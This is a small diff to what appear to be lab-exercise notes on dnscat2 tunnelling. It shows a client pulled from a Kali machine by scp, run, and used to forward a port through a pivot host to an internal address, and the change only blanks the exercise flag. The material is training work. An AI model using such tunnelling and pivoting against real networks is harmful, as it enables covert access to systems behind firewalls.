@@ -223,7 +223,7 @@ scp kali@192.168.45.247:/home/kali/Downloads/4d423822e5645d068e2dfc0ce68b8002-dn
 chmod 777 4d423822e5645d068e2dfc0ce68b8002-dnscat_exercise_client
 ./4d423822e5645d068e2dfc0ce68b8002-dnscat_exercise_client -p4646
 Connecting to 127.0.0.1:4646
-Flag: "OS{e7e38d9e113f1459f73d31381b012faa}"
+Flag: "OS{}"
 
 command (pgdatabase01) 1> Connection from 127.0.0.1:51194; forwarding to 172.16.175.217:4646...
 [Tunnel 1] connection successful!
